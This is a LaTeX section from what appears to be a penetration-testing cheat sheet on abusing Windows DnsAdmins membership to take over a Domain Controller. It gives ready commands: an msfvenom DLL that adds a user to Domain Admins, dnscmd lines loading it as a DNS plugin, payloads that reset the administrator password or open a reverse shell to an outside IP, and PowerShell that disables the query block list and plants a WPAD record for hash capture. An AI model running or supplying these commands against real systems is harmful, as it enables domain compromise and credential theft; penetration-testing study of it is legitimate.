\subsection{Abusing Buil-in: DnsAdmin}
 The DNS service runs as \verb+NT AUTHORITY\SYSTEM+, so membership in this
 group could potentially be leveraged to escalate privileges on a Domain
 Controller or in a situation where a separate server is acting as the DNS
 server for the domain.

\subsubsection{DLL injection}
 Check this post \href{https://adsecurity.org/?p=4064}{post}.
he following attack can be performed when DNS is run on a Domain Controller (which is very common):
\begin{itemize}
    \item  DNS management is performed over RPC
    \item
        \href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723}{ServerLevelPluginDll} allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
    \item  When a member of the DnsAdmins group runs the dnscmd command below,
        the
        \verb+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll+ registry key is populated
    \item  When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
    \item  An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.
\end{itemize}

Only the dnscmd utility can be used by members of the DnsAdmins group, as they
do not directly have permission on the registry key.


\begin{verbatim}
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm 
    /add /domain' -f dll -o adduser.dll

## Loading DLL as Member of DnsAdmins
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
dnscmd.exe /config /serverlevelplugindll \\IP\share\adduser.dll

## Confirming Registry Key Added
reg query \\IP\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

## Checking Permissions on DNS Service
sc.exe sdshow DNS

## Stopping the DNS Service
 sc stop dns
# might be necessary to to add hostname
sc \\resolute stop dns

## Starting the DNS Service
sc start dns

## Confirming Group Membership
net group "Domain Admins" /dom

## Deleting Registry Key
 reg delete \\IP\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
\end{verbatim}

other payloads
\begin{verbatim}
windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain'
windows/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=4444 
\end{verbatim}


As detailed in this
\href{http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html}{post}, 
it is also possible to use
\href{https://github.com/gentilkiwi/mimikatz/tree/master/mimilib}{mimilib.dll}
to gain command execution by modifying the \verb+kdns.c+ file to
execute a reverse shell one-liner or another command of our choosing.

\subsubsection{Creating a WPAD Record}
Another way to abuse DnsAdmins group privileges is by creating a WPAD record.
Membership in this group gives us the rights to
\href{https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps}{disable
global query block security}, which by default blocks this attack. Server 2008
first introduced the ability to add to a global query block list on a DNS
server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and
Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global
query block list. These protocols are quite vulnerable to hijacking, and any
domain user can create a computer object or DNS record containing those names.

After disabling the global query block list and creating a WPAD record, every
machine running WPAD with default settings will have its traffic proxied
through the attack machine. Tool such as Responder~\ref{tool:responder} or
Inveigh~\ref{tool:inveigh} to perform traffic spoofing, and attempt to capture
password hashes and crack them offline or perform an SMBRelay attack.

\begin{verbatim}
## Disabling the Global Query Block List
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
## Adding a WPAD Record
Add-DnsServerResourceRecordA -Name wpad -ZoneName NAME -ComputerName DNS_FQDN
    -IPv4Address IP
\end{verbatim}
